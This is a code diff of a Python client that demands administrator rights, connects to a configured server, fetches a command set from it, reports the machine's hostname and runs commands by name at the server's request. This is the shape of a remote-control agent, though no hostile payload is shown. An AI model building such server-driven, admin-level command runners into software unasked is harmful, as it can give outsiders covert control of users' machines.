@@ -1,13 +1,11 @@
+from common.commands import commandFunctions, init_command_functions
 from common.util import *
 
-import common.actions as actions
-import win32api
 import socket
 import json
 import sys
 import os
 
-win32api.MessageBox(0, "a", "b")
 with open("config.json", "r") as f: config = json.load(f)
 IP = config["ip"]
 PORT = config["port"]
@@ -27,9 +25,13 @@ def receive():
         print(data)
         data = json.loads(data.decode("utf-8"))
         if data["request_type"] == "action":
-            try: actionFunctions[data["type"]]()
+            try: commandFunctions[data["type"]]()
             except KeyError: print(f"Unknown Action: {data['type']}")
             continue
+        elif data["request_type"] == "callback":
+            if data["type"] == "commands":
+                init_command_functions(data["commands"])
+                send(s, {"request_type": "login", "role": "0", "pc_name": socket.gethostname()})
 
 if __name__ == "__main__":
     if not is_admin():
@@ -38,19 +40,9 @@ if __name__ == "__main__":
             break
         os._exit(0)
 
-    try: win32api.MessageBox(0, str(os.listdir("common/actions")), "title")
-    except: win32api.MessageBox(0, "a", "b")
-
-    actionFunctions = {}
-    for file in os.listdir("common/actions"):
-        if file == "__init__.py" or os.path.isdir(f"common/actions/{file}"): continue
-
-        file = file.removesuffix(".py")
-        actionFunctions[file] = getattr(actions, file)
-
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((IP, PORT))
 
-    send(s, {"request_type": "login", "role": "0", "pc_name": socket.gethostname()})
+    send(s, {"request_type": "get_commands"})
 
     receive()
